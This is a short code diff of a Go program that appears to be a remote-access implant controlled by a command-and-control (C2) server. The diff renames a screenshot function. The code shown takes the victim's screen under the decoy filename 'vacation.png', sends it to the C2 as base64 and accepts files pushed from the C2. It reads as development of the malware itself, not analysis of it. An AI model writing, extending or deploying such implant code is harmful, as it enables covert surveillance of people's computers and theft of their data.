@@ -59,7 +59,7 @@ func main() {
 				}
 			}
 		} else if cmd == "capturescr" {
-			result := take_screenshot()
+			result := capture_scr()
 			send_resp(conn, fmt.Sprintf("img:%s", result))
 		} else if strings.Split(cmd, ":")[0] == "file" {
 			// receiving file from C2
@@ -221,7 +221,7 @@ func save_file(file string, b64_string string) bool {
 }
 
 // take a screenshot, return its base64 value and then clean up
-func take_screenshot() string {
+func capture_scr() string {
 	bnds := screenshot.GetDisplayBounds(0)
 	img, _ := screenshot.CaptureRect(bnds)
 	file, _ := os.Create("vacation.png")
